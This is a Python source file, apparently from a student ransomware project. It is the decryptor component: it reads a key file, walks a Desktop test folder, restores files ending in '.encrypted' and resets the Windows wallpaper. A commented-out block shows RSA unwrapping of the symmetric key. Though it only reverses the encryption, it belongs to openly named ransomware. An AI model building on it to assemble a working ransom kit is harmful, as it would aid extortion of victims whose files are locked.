import os
import Ransomware as r
import ctypes

def change_wallpaper(path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    


def decrypt(path):
    global kpath
    with open(kpath, "rb") as file:
        key = file.read()

    print(key)

    rw = r.Ransomeware(key)

    for cp, dir_n, file in os.walk(path):
        for i in file:
            if i.endswith(".encrypted"):
                with open(cp + "/" + i, "rb") as f:
                    data = f.read()

                msg = rw.decrypt_data(data)
                msg  = msg

                ext = os.path.splitext(i)
                with open(cp + "/" + ext[0], "wb") as f:
                    f.write(msg)

                os.remove(cp + "/" + i)

    try:
        wpath = os.path.join(host,'Pictures','wallpaper.jpg')
        change_wallpaper(wpath)
    except:
        pass


host = os.path.expanduser('~')
path = os.path.join(host,'Desktop','Test')
kpath = os.path.join(host,'Desktop','key.txt')
decrypt(path)



"""

"C:/Users/k4li/Desktop/Test"
 with open("C:/Users/91982/Desktop/SGP-sem 5/key.txt", "rb") as file:
        encrypted_sym_key = file.read()

    prv_key = RSA.importKey(open("C:/Users/91982/Desktop/SGP-sem 5/privateKey.pem","r").read())
    decryptor = PKCS1_OAEP.new(key=prv_key)

    key = decryptor.decrypt(encrypted_sym_key)
"""
